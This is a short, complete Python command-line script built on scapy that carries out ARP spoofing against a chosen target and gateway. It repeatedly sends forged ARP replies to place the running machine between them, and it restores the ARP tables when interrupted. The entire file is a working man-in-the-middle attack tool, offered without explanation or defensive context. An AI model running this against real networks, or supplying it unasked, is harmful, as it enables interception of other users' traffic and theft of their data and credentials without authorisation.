#!/usr/bin/env python -u
import time
import scapy.all as scapy
from optparse import OptionParser

def get_mac(ip, timeout = 1):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request = broadcast/arp
    answers = scapy.srp(arp_request, timeout=int(timeout), verbose=False)[0]
    return answers[0][1].hwsrc

def arp_spoofing(victim, spoofing_ip):
    packet = scapy.ARP(op=2, psrc=spoofing_ip, pdst=victim, hwdst=get_mac(victim))
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_hw = get_mac(dest_ip)
    src_hw = get_mac(src_ip)
    des_pkt = scapy.ARP(op=2, psrc=src_ip, hwsrc=src_hw, pdst=dest_ip, hwdst=dest_hw)
    src_pkt = scapy.ARP(op=2, psrc=dest_ip, hwsrc=dest_hw, pdst=src_ip, hwdst=src_hw)
    scapy.send(des_pkt, verbose=False, count=4)
    scapy.send(src_pkt, verbose=False, count=4)
    print("[#] Every thing is restored")


parser = OptionParser()
parser.add_option('-t', '--target', dest="target", help="Ip For your target")
parser.add_option('-g', '--gateway', dest="gateway", help="The gateway that you want to spoof")
args = parser.parse_args()[0]

target_ip = args.target
gateway_ip = args.gateway

pkt_cnt = 2
print("[+] Spoofing Started [+]")
try: 
    while True:
        arp_spoofing(target_ip, gateway_ip)
        arp_spoofing(gateway_ip, target_ip)
        print(f"\r[+] Sent {pkt_cnt} packet", end="")
        pkt_cnt += 2
        time.sleep(2)
except:
    print("\n>> Restoring Old Sate")
    
    restore(target_ip, gateway_ip)
    print("[>] Detected CTRL + C .... Quitting. [<]")
